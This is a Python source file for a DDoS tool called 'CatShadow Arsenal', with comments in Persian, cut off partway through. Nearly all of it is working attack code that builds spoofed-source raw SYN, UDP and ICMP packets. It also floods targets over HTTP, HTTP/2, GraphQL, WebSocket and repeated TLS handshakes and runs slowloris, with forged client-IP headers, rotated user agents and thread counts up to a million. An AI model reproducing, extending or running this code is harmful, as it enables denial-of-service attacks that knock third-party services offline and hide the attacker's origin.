#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CATSHADOW ARSENAL - ULTIMATE OMEGA EDITION (FULLY FIXED)
🌍 Multi-Language | 🎨 Light/Dark Theme | 💀 Ultimate Power
"""

# ========================== IMPORTS ==========================
import asyncio
import aiohttp
import random
import socket
import struct
import sys
import threading
import time
import ssl
import urllib.parse
import os
import json
import base64
import hashlib
import logging
import ipaddress
import itertools
import uuid
import concurrent.futures
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, Counter
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, field_validator
import uvicorn
import psutil

# ========================== LOGGING ==========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("catshadow_omega")

# ========================== CONFIGURATION ==========================
MAX_THREADS = 1000000
MAX_DURATION = 86400
USE_RAW_SOCKETS = True
DEFAULT_THREADS = 10000
DEFAULT_DURATION = 300
MAX_EFFECTIVE_THREADS = 50000
MAX_CONCURRENT_CORO = 500
CENTRAL_LOOP_NAME = "catshadow-central"
STATS_FLUSH_INTERVAL = 0.5  # هر چند ثانیه شمارنده‌های محلی به مرکزی اضافه شوند


# ========================== CHECKSUM HELPERS ==========================
def _checksum(data: bytes) -> int:
    """محاسبه checksum استاندارد اینترنت (RFC 1071)"""
    if len(data) % 2 == 1:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return (~total) & 0xffff


def _build_ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int, ttl: int = 64) -> bytes:
    """ساخت IP header با checksum درست"""
    total_len = 20 + payload_len
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69, 0, total_len, 0, 0, ttl, proto, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    # محاسبه checksum روی header
    cksum = _checksum(ip_header)
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69, 0, total_len, 0, 0, ttl, proto, cksum,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
    )
    return ip_header


def _build_tcp_syn(src_ip: str, dst_ip: str, src_port: int, dst_port: int,
                   seq: int, ttl: int = 64) -> bytes:
    """ساخت TCP SYN packet با IP و TCP checksum درست"""
    # TCP header با options (MSS + SACK + Timestamp + NOP + Window Scale)
    tcp_header_base = struct.pack(
        '!HHLLBBHHH',
        src_port, dst_port, seq, 0, 0x50, 0x02, 65535, 0, 0
    )
    options = (
        b'\x02\x04\x05\xb4'                              # MSS
        +b'\x04\x02'                                      # SACK permitted
        +b'\x08\x0a' + struct.pack('!II', int(time.time()), 0)  # Timestamp
        +b'\x01'                                          # NOP
        +b'\x03\x03\x07'                                  # Window Scale
    )
    data_offset = (20 + len(options)) // 4
    tcp_header = struct.pack(
        '!HHLLBBHHH',
        src_port, dst_port, seq, 0,
        (data_offset << 4), 0x02, 65535, 0, 0
    ) + options

    # Pseudo-header برای TCP checksum
    pseudo = struct.pack(
        '!4s4sBBH',
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        0, socket.IPPROTO_TCP, len(tcp_header)
    )
    tcp_cksum = _checksum(pseudo + tcp_header)
    tcp_header = struct.pack(
        '!HHLLBBH',
        src_port, dst_port, seq, 0,
        (data_offset << 4), 0x02, 65535
    ) + struct.pack('!H', tcp_cksum) + struct.pack('!H', 0) + options

    ip_header = _build_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp_header), ttl)
    return ip_header + tcp_header


def _build_udp_packet(src_ip: str, dst_ip: str, src_port: int, dst_port: int,
                      payload: bytes, ttl: int = 64) -> bytes:
    """ساخت UDP packet با checksum درست"""
    udp_len = 8 + len(payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)

    # Pseudo-header برای UDP checksum
    pseudo = struct.pack(
        '!4s4sBBH',
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        0, socket.IPPROTO_UDP, udp_len
    )
    udp_cksum = _checksum(pseudo + udp_header + payload)
    if udp_cksum == 0:
        udp_cksum = 0xffff  # UDP checksum صفر یعنی "no checksum"
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_cksum)

    ip_header = _build_ip_header(src_ip, dst_ip, socket.IPPROTO_UDP, udp_len, ttl)
    return ip_header + udp_header + payload


def _build_icmp_packet(src_ip: str, dst_ip: str, payload: bytes) -> bytes:
    """ساخت ICMP Echo Request با checksum درست"""
    icmp_type = 8
    icmp_code = 0
    icmp_id = random.randint(0, 65535)
    icmp_seq = random.randint(0, 65535)

    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
    packet_for_cksum = icmp_header + payload
    icmp_cksum = _checksum(packet_for_cksum)
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_cksum, icmp_id, icmp_seq)

    icmp_packet = icmp_header + payload
    ip_header = _build_ip_header(src_ip, dst_ip, socket.IPPROTO_ICMP, len(icmp_packet), 64)
    return ip_header + icmp_packet


# ========================== CENTRAL ASYNC LOOP ==========================
class CentralAsyncLoop:
    """
    یک event loop مرکزی که در یک thread جداگانه اجرا می‌شود.
    - همه coroهای سنگین از threadهای worker به اینجا فرستاده می‌شوند.
    - از run_coroutine_threadsafe استفاده می‌کند (thread-safe).
    - در پایان، graceful shutdown می‌شود.
    """

    def __init__(self, name: str = CENTRAL_LOOP_NAME):
        self.name = name
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.thread: Optional[threading.Thread] = None
        self._ready = threading.Event()
        self._stopped = threading.Event()

    def start(self) -> None:
        if self.thread is not None and self.thread.is_alive():
            return
        self._ready.clear()
        self._stopped.clear()
        self.thread = threading.Thread(target=self._run_loop, name=self.name, daemon=True)
        self.thread.start()
        self._ready.wait(timeout=5.0)

    def _run_loop(self) -> None:
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self._ready.set()
        try:
            self.loop.run_forever()
        except Exception as e:
            logger.error(f"[{self.name}] loop crashed: {e}")
        finally:
            try:
                pending = asyncio.all_tasks(self.loop)
                for task in pending:
                    task.cancel()
                if pending:
                    self.loop.run_until_complete(
                        asyncio.gather(*pending, return_exceptions=True)
                    )
                self.loop.run_until_complete(self.loop.shutdown_asyncgens())
            except Exception:
                pass
            finally:
                try:
                    self.loop.close()
                except Exception:
                    pass
                self._stopped.set()

    def submit(self, coro, timeout: Optional[float] = None):
        if self.loop is None or self.loop.is_closed():
            raise RuntimeError("Central loop is not running")
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        try:
            return future.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            future.cancel()
            raise

    def submit_nowait(self, coro):
        if self.loop is None or self.loop.is_closed():
            raise RuntimeError("Central loop is not running")
        return asyncio.run_coroutine_threadsafe(coro, self.loop)

    def stop(self, timeout: float = 5.0) -> None:
        if self.loop is None or self.loop.is_closed():
            return
        try:
            self.loop.call_soon_threadsafe(self.loop.stop)
        except RuntimeError:
            pass
        if self.thread is not None:
            self.thread.join(timeout=timeout)
        self._stopped.wait(timeout=timeout)

    @property
    def is_running(self) -> bool:
        return (
            self.loop is not None
            and not self.loop.is_closed()
            and self.thread is not None
            and self.thread.is_alive()
        )


# ========================== THREAD-LOCAL STATS ==========================
class ThreadLocalStats:
    """
    شمارنده‌های محلی per-thread.
    هر thread شمارنده‌های خودش را دارد و بدون lock آپدیت می‌کند.
    هر چند ثانیه، این شمارنده‌ها به شمارنده‌های مرکزی اضافه می‌شوند.
    """
    __slots__ = ('sent', 'failed', 'bytes_sent', 'errors', 'methods_used')

    def __init__(self):
        self.sent = 0
        self.failed = 0
        self.bytes_sent = 0
        self.errors: Dict[str, int] = defaultdict(int)
        self.methods_used: Dict[str, int] = defaultdict(int)

    def flush_to(self, target: Dict[str, Any], lock: threading.Lock) -> None:
        """انتقال شمارنده‌ها به مرکزی با یک lock (به‌ندرت صدا زده می‌شود)"""
        if self.sent == 0 and self.failed == 0 and self.bytes_sent == 0:
            return
        with lock:
            target["sent"] += self.sent
            target["failed"] += self.failed
            target["bytes_sent"] += self.bytes_sent
            for k, v in self.errors.items():
                target["errors"][k] += v
            for k, v in self.methods_used.items():
                target["methods_used"][k] += v
        self.sent = 0
        self.failed = 0
        self.bytes_sent = 0
        self.errors.clear()
        self.methods_used.clear()


# ========================== PYDANTIC MODELS ==========================
class AttackConfig(BaseModel):
    target: str
    port: int = 80
    method: str = "INFINITY_MIX"
    threads: int = DEFAULT_THREADS
    duration: int = DEFAULT_DURATION
    bandwidth_limit: int = 0
    use_proxy: bool = False
    lang: str = "en"

    @field_validator('threads')
    def validate_threads(cls, v):
        if v > MAX_THREADS:
            raise ValueError(f"Threads cannot exceed {MAX_THREADS}")
        if v < 1:
            raise ValueError("Threads must be at least 1")
        return v

    @field_validator('duration')
    def validate_duration(cls, v):
        if v > MAX_DURATION:
            raise ValueError(f"Duration cannot exceed {MAX_DURATION} seconds")
        if v < 1:
            raise ValueError("Duration must be at least 1 second")
        return v


# ========================== ULTIMATE ATTACK ENGINE ==========================
class CatShadowOmega:
    def __init__(self):
        self.running = False
        self._stop_flag = False
        self.target_url = ""
        self.target_ip = ""
        self.target_host = ""
        self.target_port = 80
        self.method = "INFINITY_MIX"
        self.threads = DEFAULT_THREADS
        self.duration = DEFAULT_DURATION
        self.bandwidth_limit = 0
        self.use_proxy = False
        self.lang = "en"
        self.current_config: Optional[AttackConfig] = None

        # آمار مرکزی (فقط با lock آپدیت می‌شود)
        self.stats: Dict[str, Any] = {
            "sent": 0,
            "failed": 0,
            "bytes_sent": 0,
            "start_time": None,
            "end_time": None,
            "end_time_planned": None,
            "monotonic_start": None,
            "errors": defaultdict(int),
            "methods_used": Counter(),
        }
        self.lock = threading.Lock()
        self.launch_lock = threading.Lock()  # برای جلوگیری از race در launch

        # Thread-local stats
        self._tls = threading.local()

        # Central async loop
        self.central_loop = CentralAsyncLoop(name=CENTRAL_LOOP_NAME)
        self.central_loop_started = False
        self.max_concurrent_coro = MAX_CONCURRENT_CORO
        self.coro_semaphore: Optional[asyncio.Semaphore] = None

        # aiohttp sessions
        self._sessions: Dict[str, aiohttp.ClientSession] = {}

        # Raw sockets
        self.raw_tcp: Optional[socket.socket] = None
        self.raw_udp: Optional[socket.socket] = None
        self.raw_icmp: Optional[socket.socket] = None

        # Bandwidth control
        self._last_bytes_for_bw = 0
        self._last_bw_check = time.monotonic()

        # ThreadPoolExecutor
        self.executor: Optional[ThreadPoolExecutor] = None
        self.futures: List[concurrent.futures.Future] = []

        # Stats flusher
        self._stats_flusher_thread: Optional[threading.Thread] = None

    # ---------- THREAD-LOCAL STATS ----------
    def _get_tls(self) -> ThreadLocalStats:
        """گرفتن یا ساخت شمارنده‌های محلی برای thread فعلی"""
        tls = getattr(self._tls, 'stats', None)
        if tls is None:
            tls = ThreadLocalStats()
            self._tls.stats = tls
        return tls

    def _flush_tls(self) -> None:
        """انتقال شمارنده‌های محلی thread فعلی به مرکزی"""
        tls = getattr(self._tls, 'stats', None)
        if tls is not None:
            tls.flush_to(self.stats, self.lock)

    def _stats_flusher(self) -> None:
        """Thread پس‌زمینه که دوره‌ای شمارنده‌ها را flush می‌کند"""
        while not self._stop_flag:
            time.sleep(STATS_FLUSH_INTERVAL)
            # همه threadهای worker شمارنده‌های خودشان را دارند
            # اینجا فقط شمارنده‌های thread اصلی را flush می‌کنیم
            self._flush_tls()

    # ---------- SOCKET INIT ----------
    def _init_raw_sockets(self) -> None:
        if not USE_RAW_SOCKETS:
            return
        try:
            self.raw_tcp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self.raw_tcp.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.raw_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.raw_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        except Exception as e:
            logger.warning(f"TCP raw socket init failed: {e}")
            self.raw_tcp = None

        try:
            self.raw_udp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            self.raw_udp.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.raw_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.raw_udp.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        except Exception as e:
            logger.warning(f"UDP raw socket init failed: {e}")
            self.raw_udp = None

        try:
            self.raw_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.raw_icmp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.raw_icmp.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        except Exception as e:
            logger.warning(f"ICMP raw socket init failed: {e}")
            self.raw_icmp = None

    # ---------- HELPERS ----------
    def _random_ip(self) -> str:
        while True:
            ip = ipaddress.ip_address(random.getrandbits(32))
            if (not ip.is_private and not ip.is_loopback and
                not ip.is_multicast and not ip.is_reserved and
                not ip.is_link_local and not ip.is_unspecified):
                return str(ip)

    def _random_port(self) -> int:
        return random.randint(1024, 65535)

    def _random_ua(self) -> str:
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/20100101 Firefox/121.0",
        ]
        return random.choice(uas)

    def _obfuscate(self, data: bytes) -> str:
        key = random.randint(1, 255)
        xored = bytes(b ^ key for b in data)
        return f"{key:02x}{base64.b64encode(xored).decode()}"

    def _check_bandwidth(self) -> bool:
        """کنترل پهنای باند با محاسبه نرخ لحظه‌ای"""
        if self.bandwidth_limit == 0:
            return True
        now = time.monotonic()
        elapsed = now - self._last_bw_check
        if elapsed >= 1.0:
            with self.lock:
                current_bytes = self.stats["bytes_sent"]
            delta_bytes = current_bytes - self._last_bytes_for_bw
            current_mbps = (delta_bytes * 8) / elapsed / 1_000_000
            if current_mbps > self.bandwidth_limit:
                over = current_mbps - self.bandwidth_limit
                sleep_time = min(0.05, over / 1000.0)
                time.sleep(sleep_time)
            self._last_bytes_for_bw = current_bytes
            self._last_bw_check = now
        return True

    # ---------- CENTRAL LOOP HELPERS ----------
    def _start_central_loop(self) -> None:
        if self.central_loop_started and self.central_loop.is_running:
            return
        self.central_loop.start()
        self.central_loop_started = True
        logger.info("🔁 Central async loop started")

        async def _create_semaphore():
            self.coro_semaphore = asyncio.Semaphore(self.max_concurrent_coro)

        try:
            self.central_loop.submit(_create_semaphore(), timeout=5.0)
        except Exception as e:
            logger.error(f"Failed to create semaphore: {e}")

    def _stop_central_loop(self) -> None:
        if not self.central_loop_started:
            return
        if self.central_loop.is_running and self._sessions:
            async def _close_sessions():
                for name, session in list(self._sessions.items()):
                    try:
                        if not session.closed:
                            await session.close()
                    except Exception:
                        pass
                self._sessions.clear()
            try:
                self.central_loop.submit(_close_sessions(), timeout=3.0)
            except Exception as e:
                logger.debug(f"Session close error: {e}")
        try:
            self.central_loop.stop(timeout=5.0)
        except Exception as e:
            logger.debug(f"Central loop stop error: {e}")
        self.central_loop_started = False
        self.coro_semaphore = None
        logger.info("🔁 Central async loop stopped")

    async def _get_session(self, session_type: str = "default") -> aiohttp.ClientSession:
        existing = self._sessions.get(session_type)
        if existing is not None and not existing.closed:
            return existing
        connector = aiohttp.TCPConnector(
            limit=0, ttl_dns_cache=0, force_close=False,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=2)
        session = aiohttp.ClientSession(
            connector=connector, timeout=timeout,
            headers={"Connection": "keep-alive"},
        )
        self._sessions[session_type] = session
        return session

    # ---------- ASYNC RUNNER (گزینه C) ----------
    def _run_async(self, coro, use_central: bool = False, timeout: Optional[float] = None):
        if use_central and self.central_loop.is_running:
            try:
                return self.central_loop.submit(coro, timeout=timeout)
            except Exception as e:
                logger.debug(f"Central loop submit failed: {e}")
                return None
        return self._run_async_local(coro)

    def _run_async_local(self, coro):
        created = False
        loop = None
        try:
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = None
            if loop is None:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                created = True
            if loop.is_running():
                raise RuntimeError("_run_async_local called from within a running loop.")
            return loop.run_until_complete(coro)
        except (KeyboardInterrupt, SystemExit):
            raise
        except asyncio.CancelledError:
            return None
        except Exception as e:
            logger.debug(f"Local async error: {e}")
            return None
        finally:
            if created and loop is not None:
                try:
                    pending = asyncio.all_tasks(loop)
                    for task in pending:
                        task.cancel()
                    if pending:
                        loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                    loop.run_until_complete(loop.shutdown_asyncgens())
                except Exception:
                    pass
                finally:
                    try:
                        loop.close()
                    except Exception:
                        pass
                    asyncio.set_event_loop(None)

    # ---------- LAYER 4 ATTACKS ----------
    def _syn_tsunami(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        if not self.raw_tcp:
            self._tcp_spam(target_ip, target_port)
            return
        local_sent = 0
        local_bytes = 0
        last_flush = time.monotonic()
        while not self._stop_flag:
            self._check_bandwidth()
            src_ip = self._random_ip()
            src_port = self._random_port()
            seq = random.getrandbits(32)
            ttl = random.randint(32, 128)
            packet = _build_tcp_syn(src_ip, target_ip, src_port, target_port, seq, ttl)
            try:
                self.raw_tcp.sendto(packet, (target_ip, target_port))
                local_sent += 1
                local_bytes += len(packet)
                tls.methods_used["SYN_TSUN"] += 1
            except Exception:
                tls.failed += 1
                tls.errors["syn_send"] += 1
            # flush دوره‌ای
            now = time.monotonic()
            if now - last_flush >= STATS_FLUSH_INTERVAL:
                tls.sent += local_sent
                tls.bytes_sent += local_bytes
                tls.flush_to(self.stats, self.lock)
                local_sent = 0
                local_bytes = 0
                last_flush = now
        # flush نهایی
        tls.sent += local_sent
        tls.bytes_sent += local_bytes
        tls.flush_to(self.stats, self.lock)

    def _udp_apocalypse(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        if not self.raw_udp:
            self._udp_apocalypse_fallback(target_ip, target_port)
            return
        local_sent = 0
        local_bytes = 0
        last_flush = time.monotonic()
        while not self._stop_flag:
            self._check_bandwidth()
            src_ip = self._random_ip()
            src_port = self._random_port()
            payload_size = random.randint(1400, 8192)
            payload = os.urandom(payload_size)
            packet = _build_udp_packet(src_ip, target_ip, src_port, target_port, payload)
            try:
                self.raw_udp.sendto(packet, (target_ip, target_port))
                local_sent += 1
                local_bytes += len(packet)
                tls.methods_used["UDP_APOC"] += 1
            except Exception:
                tls.failed += 1
                tls.errors["udp_raw_send"] += 1
            now = time.monotonic()
            if now - last_flush >= STATS_FLUSH_INTERVAL:
                tls.sent += local_sent
                tls.bytes_sent += local_bytes
                tls.flush_to(self.stats, self.lock)
                local_sent = 0
                local_bytes = 0
                last_flush = now
        tls.sent += local_sent
        tls.bytes_sent += local_bytes
        tls.flush_to(self.stats, self.lock)

    def _udp_apocalypse_fallback(self, target_ip: str, target_port: int) -> None:
        """اگر raw socket نیست، از UDP معمولی استفاده کن"""
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_sent = 0
        local_bytes = 0
        last_flush = time.monotonic()
        while not self._stop_flag:
            self._check_bandwidth()
            payload = os.urandom(random.randint(1024, 1400))
            try:
                sock.sendto(payload, (target_ip, target_port))
                local_sent += 1
                local_bytes += len(payload)
                tls.methods_used["UDP_APOC"] += 1
            except Exception:
                tls.failed += 1
                tls.errors["udp_send"] += 1
            now = time.monotonic()
            if now - last_flush >= STATS_FLUSH_INTERVAL:
                tls.sent += local_sent
                tls.bytes_sent += local_bytes
                tls.flush_to(self.stats, self.lock)
                local_sent = 0
                local_bytes = 0
                last_flush = now
        tls.sent += local_sent
        tls.bytes_sent += local_bytes
        tls.flush_to(self.stats, self.lock)

    def _icmp_storm(self, target_ip: str) -> None:
        tls = self._get_tls()
        if not self.raw_icmp:
            return
        local_sent = 0
        local_bytes = 0
        last_flush = time.monotonic()
        while not self._stop_flag:
            self._check_bandwidth()
            src_ip = self._random_ip()
            payload_size = random.randint(1024, 4096)
            payload = os.urandom(payload_size)
            packet = _build_icmp_packet(src_ip, target_ip, payload)
            try:
                self.raw_icmp.sendto(packet, (target_ip, 0))
                local_sent += 1
                local_bytes += len(packet)
                tls.methods_used["ICMP_STORM"] += 1
            except Exception:
                tls.failed += 1
                tls.errors["icmp_send"] += 1
            now = time.monotonic()
            if now - last_flush >= STATS_FLUSH_INTERVAL:
                tls.sent += local_sent
                tls.bytes_sent += local_bytes
                tls.flush_to(self.stats, self.lock)
                local_sent = 0
                local_bytes = 0
                last_flush = now
        tls.sent += local_sent
        tls.bytes_sent += local_bytes
        tls.flush_to(self.stats, self.lock)

    def _tcp_spam(self, target_ip: str, target_port: int) -> None:
        """TCP spam با socket reuse و keep-alive"""
        tls = self._get_tls()
        local_sent = 0
        local_bytes = 0
        last_flush = time.monotonic()
        sock = None
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                if sock is None:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(0.5)
                    sock.connect((target_ip, target_port))
                request = (
                    f"GET /?{uuid.uuid4().hex} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {self._random_ua()}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                sock.send(request)
                local_sent += 1
                local_bytes += len(request)
                tls.methods_used["TCP_SPAM"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1
                # اتصال را ریست کن
                if sock is not None:
                    try:
                        sock.close()
                    except Exception:
                        pass
                    sock = None
            now = time.monotonic()
            if now - last_flush >= STATS_FLUSH_INTERVAL:
                tls.sent += local_sent
                tls.bytes_sent += local_bytes
                tls.flush_to(self.stats, self.lock)
                local_sent = 0
                local_bytes = 0
                last_flush = now
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass
        tls.sent += local_sent
        tls.bytes_sent += local_bytes
        tls.flush_to(self.stats, self.lock)

    # ---------- LAYER 7 ATTACKS (ASYNC) ----------
    async def _http_flood(self, url: str) -> None:
        session = await self._get_session("http_flood")
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                if self.coro_semaphore is not None:
                    async with self.coro_semaphore:
                        await self._http_request(session, url, "HTTP_FLOOD")
                else:
                    await self._http_request(session, url, "HTTP_FLOOD")
            except Exception:
                pass
            await asyncio.sleep(0.0001)

    async def _http_request(self, session: aiohttp.ClientSession, url: str, method_tag: str) -> None:
        tls = self._get_tls()
        raw_payload = os.urandom(random.randint(256, 1024))
        obfuscated = self._obfuscate(raw_payload)
        params = {f"p{i}": base64.b64encode(os.urandom(8)).decode() for i in range(5)}
        query = urllib.parse.urlencode(params)
        url_with_query = f"{url}?{query}" if "?" not in url else f"{url}&{query}"
        headers = {
            "User-Agent": self._random_ua(),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
            "X-Forwarded-For": self._random_ip(),
            "X-Real-IP": self._random_ip(),
            "X-Request-ID": uuid.uuid4().hex,
            "X-Trace-ID": base64.b64encode(uuid.uuid4().bytes).decode(),
            "X-Data": obfuscated[:128],
        }
        # payload متوسط (نه غول‌پیکر)
        data = "&".join([f"{i}={os.urandom(32).hex()}" for i in range(20)])
        try:
            async with session.request(
                random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]),
                url_with_query,
                headers=headers,
                data=data,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=2),
            ) as resp:
                await resp.read()
            tls.sent += 1
            tls.bytes_sent += len(data) + sum(len(v) for v in headers.values())
            tls.methods_used[method_tag] += 1
        except Exception as e:
            tls.failed += 1
            tls.errors[type(e).__name__] += 1

    async def _http2_attack(self, url: str) -> None:
        """HTTP/2 واقعی با httpx (اگر نصب باشد)، وگرنه fallback به HTTP/1.1"""
        try:
            import httpx
            use_httpx = True
        except ImportError:
            use_httpx = False

        if use_httpx:
            await self._http2_with_httpx(url)
        else:
            # fallback: HTTP/1.1 با concurrency بالا
            session = await self._get_session("http2")
            while not self._stop_flag:
                self._check_bandwidth()
                tasks = []
                for _ in range(50):
                    if self.coro_semaphore is not None:
                        tasks.append(self._wrapped_request(session, url, "HTTP2_ATTACK"))
                    else:
                        tasks.append(self._http_request(session, url, "HTTP2_ATTACK"))
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)

    async def _http2_with_httpx(self, url: str) -> None:
        import httpx
        async with httpx.AsyncClient(http2=True, verify=False, timeout=2.0) as client:
            while not self._stop_flag:
                self._check_bandwidth()
                try:
                    if self.coro_semaphore is not None:
                        async with self.coro_semaphore:
                            await client.get(url, headers={"User-Agent": self._random_ua()})
                    else:
                        await client.get(url, headers={"User-Agent": self._random_ua()})
                    tls = self._get_tls()
                    tls.sent += 1
                    tls.methods_used["HTTP2_ATTACK"] += 1
                except Exception as e:
                    tls = self._get_tls()
                    tls.failed += 1
                    tls.errors[type(e).__name__] += 1

    async def _wrapped_request(self, session, url, method_tag):
        async with self.coro_semaphore:
            return await self._http_request(session, url, method_tag)

    async def _graphql_flood(self, url: str) -> None:
        session = await self._get_session("graphql")
        while not self._stop_flag:
            self._check_bandwidth()
            query = "query { __schema { types { name fields { name } } } __typename }"
            payload = json.dumps({
                "query": query,
                "variables": {f"v{i}": os.urandom(8).hex() for i in range(30)},
                "operationName": "GetSchema",
            })
            headers = {
                "User-Agent": self._random_ua(),
                "Content-Type": "application/json",
                "Accept": "application/json",
            }
            gql_url = url + "/graphql" if "/graphql" not in url else url
            try:
                if self.coro_semaphore is not None:
                    async with self.coro_semaphore:
                        async with session.post(gql_url, data=payload, headers=headers,
                                                timeout=aiohttp.ClientTimeout(total=2)) as resp:
                            await resp.read()
                else:
                    async with session.post(gql_url, data=payload, headers=headers,
                                            timeout=aiohttp.ClientTimeout(total=2)) as resp:
                        await resp.read()
                tls = self._get_tls()
                tls.sent += 1
                tls.methods_used["GRAPHQL_FLOOD"] += 1
            except Exception as e:
                tls = self._get_tls()
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    async def _websocket_flood(self, url: str) -> None:
        try:
            import websockets
        except ImportError:
            logger.warning("websockets library not installed, skipping WebSocket flood")
            return
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                uri = url.replace("http", "ws").replace("https", "wss")
                async with websockets.connect(uri, max_size=2**20, ping_interval=None) as ws:
                    await ws.send(os.urandom(1024).hex())
                    await asyncio.sleep(0.1)
                tls = self._get_tls()
                tls.sent += 1
                tls.methods_used["WEBSOCKET_FLOOD"] += 1
            except Exception as e:
                tls = self._get_tls()
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    # ---------- SPECIALIZED ATTACKS ----------
    def _ssl_reneg_attack(self, target_ip: str, target_port: int) -> None:
        """TLS handshake مکرر با session جدید (شبیه‌سازی renegotiation)"""
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                # هر بار یک handshake جدید
                ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                ssl_sock.close()
                tls.sent += 1
                tls.methods_used["SSL_RENEG"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _slowloris(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
                time.sleep(random.uniform(0.5, 2))
                sock.send(b"X-Header: " + b"X" * random.randint(100, 500) + b"\r\n")
                time.sleep(random.uniform(0.5, 2))
                sock.close()
                tls.sent += 1
                tls.methods_used["SLOWLORIS"] += 1
            except Exception as e:
                tls.failed += 1
